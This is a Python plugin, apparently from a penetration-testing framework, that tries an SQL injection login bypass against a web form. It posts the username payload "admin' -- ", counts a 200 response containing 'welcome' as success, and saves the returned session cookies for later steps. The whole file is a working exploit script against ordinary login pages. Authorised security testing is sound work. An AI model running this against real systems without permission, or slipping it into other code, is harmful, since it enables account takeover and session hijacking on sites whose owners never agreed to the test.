from __future__ import annotations

import asyncio
from typing import Any, Dict

import requests

from adaptive_pen_test.plugin_manager import BasePlugin


class SqliLoginBypassPlugin(BasePlugin):
    """Attempt SQL injection bypass against a login form."""

    async def run(self, params: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
        url = params.get("url") or params.get("form_action")
        username_field = params.get("username_field", "username")
        password_field = params.get("password_field", "password")
        payload = {username_field: "admin' -- ", password_field: "password"}
        base_url = context.get("target", {}).get("ip")
        target_url = f"http://{base_url}{url}" if url and base_url else url
        loop = asyncio.get_running_loop()
        response = await loop.run_in_executor(None, lambda: requests.post(target_url, data=payload, timeout=5))
        success = response.status_code == 200 and "welcome" in response.text.lower()
        result = {"target_url": target_url, "status": response.status_code, "success": success, "payload": payload}
        if success:
            context["session_cookie"] = response.cookies.get_dict()
        return result
